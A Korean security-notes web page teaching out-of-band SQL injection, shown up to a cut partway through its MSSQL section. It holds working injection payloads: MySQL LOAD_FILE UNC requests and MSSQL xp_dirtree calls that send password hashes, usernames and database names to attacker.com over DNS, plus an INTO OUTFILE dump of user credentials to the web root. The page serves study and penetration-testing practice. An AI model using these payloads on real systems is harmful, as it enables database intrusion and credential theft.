<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-web_attacks/sql_injection/out_of_band" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Out-of-Band SQL Injection | 남키 노트</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://naaamgi.github.io/my-docusaurus-page/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://naaamgi.github.io/my-docusaurus-page/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/out_of_band/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Out-of-Band SQL Injection | 남키 노트"><meta data-rh="true" name="description" content="외부 채널을 이용한 데이터 추출 기법"><meta data-rh="true" property="og:description" content="외부 채널을 이용한 데이터 추출 기법"><meta data-rh="true" name="keywords" content="out-of-band sqli,oob sqli,dns exfiltration,http exfiltration,sql injection"><link data-rh="true" rel="icon" href="/my-docusaurus-page/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/out_of_band/"><link data-rh="true" rel="alternate" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/out_of_band/" hreflang="en"><link data-rh="true" rel="alternate" href="https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/out_of_band/" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://IKHBXIBECM-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Web Attacks","item":"https://naaamgi.github.io/my-docusaurus-page/category/web-attacks-1"},{"@type":"ListItem","position":2,"name":"SQL Injection","item":"https://naaamgi.github.io/my-docusaurus-page/category/sql-injection"},{"@type":"ListItem","position":3,"name":"Out-of-Band SQL Injection","item":"https://naaamgi.github.io/my-docusaurus-page/web_attacks/sql_injection/out_of_band"}]}</script><link rel="search" type="application/opensearchdescription+xml" title="남키 노트" href="/my-docusaurus-page/opensearch.xml">

<meta name="google-site-verification" content="TkKso4Rp4FBa7WmPeJolw4p7PHEmAgbaEN58vXpDT7s">
<meta name="algolia-site-verification" content="86D382FE0A8B0915"><link rel="stylesheet" href="/my-docusaurus-page/assets/css/styles.493a5fa7.css">
<script src="/my-docusaurus-page/assets/js/runtime~main.b12b97df.js" defer="defer"></script>
<script src="/my-docusaurus-page/assets/js/main.b02e072e.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/my-docusaurus-page/img/apple-touch-icon.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/my-docusaurus-page/"><div class="navbar__logo"><img src="/my-docusaurus-page/img/apple-touch-icon.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/my-docusaurus-page/img/apple-touch-icon.png" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">남키 노트</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/my-docusaurus-page/">docs</a><a href="https://naaamgi.github.io/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Go to Blog<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/my-docusaurus-page/"><span title="소개 (Intro)" class="linkLabel_WmDU">소개 (Intro)</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/cheatsheet/"><span title="Cheatsheet" class="categoryLinkLabel_W154">Cheatsheet</span></a><button aria-label="Expand sidebar category &#x27;Cheatsheet&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/penetration-testing/"><span title="Penetration Testing" class="categoryLinkLabel_W154">Penetration Testing</span></a><button aria-label="Expand sidebar category &#x27;Penetration Testing&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/security-tools/"><span title="Security Tools" class="categoryLinkLabel_W154">Security Tools</span></a><button aria-label="Expand sidebar category &#x27;Security Tools&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/my-docusaurus-page/category/web-attacks-1/"><span title="Web Attacks" class="categoryLinkLabel_W154">Web Attacks</span></a><button aria-label="Collapse sidebar category &#x27;Web Attacks&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/my-docusaurus-page/category/sql-injection/"><span title="SQL Injection" class="categoryLinkLabel_W154">SQL Injection</span></a><button aria-label="Collapse sidebar category &#x27;SQL Injection&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sql_injection_기초/"><span title="SQL Injection 기초" class="linkLabel_WmDU">SQL Injection 기초</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/in_band_sqli/"><span title="In-band SQL Injection" class="linkLabel_WmDU">In-band SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/error_based/"><span title="Error-based SQL Injection" class="linkLabel_WmDU">Error-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/union_based/"><span title="Union-based SQL Injection" class="linkLabel_WmDU">Union-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/blind_sqli/"><span title="Blind SQL Injection 개요" class="linkLabel_WmDU">Blind SQL Injection 개요</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/boolean_based/"><span title="Boolean-based Blind SQL Injection" class="linkLabel_WmDU">Boolean-based Blind SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/time_based/"><span title="Time-based Blind SQL Injection" class="linkLabel_WmDU">Time-based Blind SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/out_of_band/"><span title="Out-of-Band SQL Injection" class="linkLabel_WmDU">Out-of-Band SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/stacked_queries/"><span title="Stacked Queries SQL Injection" class="linkLabel_WmDU">Stacked Queries SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/second_order/"><span title="Second-Order SQL Injection" class="linkLabel_WmDU">Second-Order SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/waf_bypass/"><span title="WAF 우회 기법 (WAF Bypass)" class="linkLabel_WmDU">WAF 우회 기법 (WAF Bypass)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/database_specific/"><span title="DBMS별 특화 기법" class="linkLabel_WmDU">DBMS별 특화 기법</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/rooted_based/"><span title="Rooted-based SQL Injection" class="linkLabel_WmDU">Rooted-based SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/nosql_injection/"><span title="NoSQL Injection" class="linkLabel_WmDU">NoSQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/advanced_exploitation/"><span title="고급 익스플로잇 (Advanced Exploitation)" class="linkLabel_WmDU">고급 익스플로잇 (Advanced Exploitation)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sqlmap_가이드/"><span title="SQLMap 완벽 가이드" class="linkLabel_WmDU">SQLMap 완벽 가이드</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/ghauri/"><span title="Ghauri - 차세대 SQL Injection 도구" class="linkLabel_WmDU">Ghauri - 차세대 SQL Injection 도구</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/my-docusaurus-page/web_attacks/sql_injection/sqliv/"><span title="SQLiv - 대량 SQL Injection 스캐너" class="linkLabel_WmDU">SQLiv - 대량 SQL Injection 스캐너</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/my-docusaurus-page/category/sk-rookies/"><span title="SK Rookies" class="categoryLinkLabel_W154">SK Rookies</span></a><button aria-label="Expand sidebar category &#x27;SK Rookies&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/my-docusaurus-page/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/my-docusaurus-page/category/web-attacks-1/"><span>Web Attacks</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/my-docusaurus-page/category/sql-injection/"><span>SQL Injection</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Out-of-Band SQL Injection</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Out-of-Band SQL Injection</h1></header>
<blockquote>
<p>Out-of-Band SQLi는 데이터베이스가 외부 서버와 통신하는 기능을 악용하여, HTTP나 DNS 등의 별도 채널을 통해 데이터를 추출하는 고급 기법입니다.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="개념-concept">개념 (Concept)<a href="#개념-concept" class="hash-link" aria-label="Direct link to 개념 (Concept)" title="Direct link to 개념 (Concept)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="out-of-band-sqli란">Out-of-Band SQLi란?<a href="#out-of-band-sqli란" class="hash-link" aria-label="Direct link to Out-of-Band SQLi란?" title="Direct link to Out-of-Band SQLi란?" translate="no">​</a></h3>
<p><strong>Out-of-Band (OOB) SQL Injection</strong>은 쿼리 결과를 <strong>직접 응답으로 받지 않고</strong>, 데이터베이스 서버가 <strong>공격자의 외부 서버로 데이터를 전송</strong>하도록 만드는 기법입니다.</p>
<p><strong>작동 원리</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. 악의적 SQL 쿼리 주입</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. DB 서버 → 공격자 서버로 DNS/HTTP 요청</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. 공격자 서버 로그에서 데이터 확인</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="일반-sqli-vs-out-of-band-sqli">일반 SQLi vs Out-of-Band SQLi<a href="#일반-sqli-vs-out-of-band-sqli" class="hash-link" aria-label="Direct link to 일반 SQLi vs Out-of-Band SQLi" title="Direct link to 일반 SQLi vs Out-of-Band SQLi" translate="no">​</a></h3>
<table><thead><tr><th>구분</th><th>In-band/Blind SQLi</th><th>Out-of-Band SQLi</th></tr></thead><tbody><tr><td><strong>데이터 전송 경로</strong></td><td>웹 애플리케이션 응답</td><td>DNS/HTTP 등 외부 채널</td></tr><tr><td><strong>속도</strong></td><td>느림 (Time-based는 특히)</td><td>빠름 (즉시 확인)</td></tr><tr><td><strong>필요 조건</strong></td><td>웹 응답 확인 가능</td><td>DB 외부 통신 권한</td></tr><tr><td><strong>WAF 우회</strong></td><td>어려움</td><td>쉬움</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="사용-시나리오">사용 시나리오<a href="#사용-시나리오" class="hash-link" aria-label="Direct link to 사용 시나리오" title="Direct link to 사용 시나리오" translate="no">​</a></h3>
<p>Out-of-Band는 다음 상황에서 <strong>유일한 선택지</strong>:</p>
<ol>
<li>
<p><strong>Blind SQLi가 불가능한 경우</strong></p>
<ul>
<li>Time-based가 차단됨 (SLEEP, WAITFOR 함수 비활성화)</li>
<li>Boolean-based 응답 차이 없음</li>
</ul>
</li>
<li>
<p><strong>결과를 볼 수 없는 경우</strong></p>
<ul>
<li>INSERT/UPDATE/DELETE 쿼리만 실행 가능</li>
<li>백그라운드 작업으로 실행됨</li>
</ul>
</li>
<li>
<p><strong>빠른 추출이 필요한 경우</strong></p>
<ul>
<li>Time-based는 너무 느림</li>
<li>대용량 데이터 추출</li>
</ul>
</li>
</ol>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dbms별-out-of-band-기법">DBMS별 Out-of-Band 기법<a href="#dbms별-out-of-band-기법" class="hash-link" aria-label="Direct link to DBMS별 Out-of-Band 기법" title="Direct link to DBMS별 Out-of-Band 기법" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mysql">MySQL<a href="#mysql" class="hash-link" aria-label="Direct link to MySQL" title="Direct link to MySQL" translate="no">​</a></h3>
<p>MySQL은 기본적으로 <strong>Out-of-Band가 제한적</strong>입니다.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="load_file--dns-unc-path---windows-전용">LOAD_FILE + DNS (UNC Path - Windows 전용)<a href="#load_file--dns-unc-path---windows-전용" class="hash-link" aria-label="Direct link to LOAD_FILE + DNS (UNC Path - Windows 전용)" title="Direct link to LOAD_FILE + DNS (UNC Path - Windows 전용)" translate="no">​</a></h4>
<p><strong>Windows MySQL에서만 작동</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND LOAD_FILE(CONCAT(&#x27;</span><span class="token plain">\\\\&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;.attacker.com\\a&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>동작</strong>:</p>
<ol>
<li><code>LOAD_FILE</code>이 UNC 경로 접근 시도</li>
<li>Windows가 DNS 쿼리 수행</li>
<li><code>5f4dcc3b5aa765d61d8327deb882cf99.attacker.com</code> 조회</li>
</ol>
<p><strong>공격자 DNS 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">2026-01-28 10:15:32: Query for 5f4dcc3b5aa765d61d8327deb882cf99.attacker.com</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="select--into-outfile-파일-기반">SELECT ... INTO OUTFILE (파일 기반)<a href="#select--into-outfile-파일-기반" class="hash-link" aria-label="Direct link to SELECT ... INTO OUTFILE (파일 기반)" title="Direct link to SELECT ... INTO OUTFILE (파일 기반)" translate="no">​</a></h4>
<p><strong>웹 루트에 파일 쓰기</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; UNION SELECT username, password FROM users INTO OUTFILE &#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">var</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">www</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">html</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">output</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>제약</strong>:</p>
<ul>
<li>파일 쓰기 권한 필요 (<code>FILE</code> privilege)</li>
<li><code>secure_file_priv</code> 설정에 따라 제한됨</li>
</ul>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mssql-microsoft-sql-server">MSSQL (Microsoft SQL Server)<a href="#mssql-microsoft-sql-server" class="hash-link" aria-label="Direct link to MSSQL (Microsoft SQL Server)" title="Direct link to MSSQL (Microsoft SQL Server)" translate="no">​</a></h3>
<p>MSSQL은 <strong>Out-of-Band에 가장 유리한 DBMS</strong>입니다.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="xp_dirtree-dns-exfiltration">xp_dirtree (DNS Exfiltration)<a href="#xp_dirtree-dns-exfiltration" class="hash-link" aria-label="Direct link to xp_dirtree (DNS Exfiltration)" title="Direct link to xp_dirtree (DNS Exfiltration)" translate="no">​</a></h4>
<p><strong>기본 구문</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">EXEC</span><span class="token plain"> xp_dirtree </span><span class="token string" style="color:#e3116c">&#x27;\\attacker.com\share&#x27;</span><br></span></code></pre></div></div>
<p><strong>데이터 추출 예시</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># DB 이름 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(1024); SET @data=(SELECT DB_NAME()); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 사용자 이름 추출</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @user VARCHAR(1024); SET @user=(SELECT TOP 1 username FROM users); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@user+&#x27;.attacker.com\a&quot;</span><span class="token 